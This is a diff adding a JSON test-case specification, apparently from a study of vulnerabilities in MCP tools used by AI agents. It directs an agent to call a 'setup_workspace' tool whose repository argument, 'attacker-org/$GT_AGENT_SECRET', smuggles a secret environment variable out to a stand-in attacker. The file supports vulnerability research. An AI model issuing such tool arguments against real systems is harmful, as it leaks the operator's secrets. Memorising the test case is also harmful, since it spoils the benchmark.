@@ -1,0 +1,27 @@
+{
+  "case_id": "GH-P4-002",
+  "discovery": {
+    "repository_commit": "7c0bc69d759c7fda11dac7ec0c753c6e76aaa417",
+    "repository_url": "https://github.com/abhishek3059/multi-repository-mcp"
+  },
+  "experiment": {
+    "agent_task": "Call the frozen setup_workspace Tool and report only its returned result."
+  },
+  "mcp_path_review": {
+    "tool": "setup_workspace",
+    "tool_arguments": {
+      "async_mode": false,
+      "name": "gh-p4-002-workspace",
+      "repos": [
+        "attacker-org/$GT_AGENT_SECRET"
+      ],
+      "skip_preflight": true,
+      "workspace_root": "/tmp/gt-workspaces"
+    }
+  },
+  "schema_version": "rq1-label-free-runtime-spec/v1",
+  "vulnerability": {
+    "fixed_version": "3.1.52",
+    "vulnerable_version": "3.1.51"
+  }
+}
